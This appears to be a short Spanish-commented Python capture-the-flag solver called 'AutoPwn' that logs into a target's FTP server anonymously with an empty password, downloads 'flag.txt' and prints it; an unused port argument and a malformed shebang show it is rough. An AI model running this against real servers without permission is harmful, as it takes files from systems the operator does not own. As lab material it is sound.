#/usr/bin/python3

import ftplib
import argparse

class Exploit:
    def __init__(self, ip_address, lport):
        self.ip_address = ip_address
        self.lport = lport

    def run(self, ip_address, username, password, filename):
        try:
            # Conexión al servidor FTP
            ftp = ftplib.FTP(self.ip_address)
        
            # Inicio de sesión con nombre de usuario y contraseña
            ftp.login(username, password)
        
            # Descargar el archivo
            with open(filename, 'wb') as file:
                ftp.retrbinary('RETR ' + filename, file.write)
                   
            # Cierre de la conexión FTP
            ftp.quit()
        
        except ftplib.all_errors as e:
            print(f"Error al conectar al servidor FTP: {str(e)}")

    def read_file(self, filename):
        try:
            with open(filename, 'r') as file:
                content = file.read()
            print(f"Contenido del archivo '{filename}': {content}")
        except IOError as e:
            print(f"Error al leer el archivo: {str(e)}") 


def get_arguments():
    parser = argparse.ArgumentParser(description='Uso de AutoPwn')
    parser.add_argument('-i', '--ip', dest='ip_address', required=True, help='IP de host remoto')
    parser.add_argument('-p', '--port', dest='lport', required=True, help='Proporcionar puerto.')
    return parser.parse_args()

def main():
    args = get_arguments()

    exploit = Exploit(args.ip_address, args.lport)
    username = "Anonymous"# Define el nombre de usuario aquí
    password = ""
    filename = "flag.txt"
    exploit.run(args.ip_address, username, password, filename)
    exploit.read_file(filename)

if __name__ == '__main__':
    main()


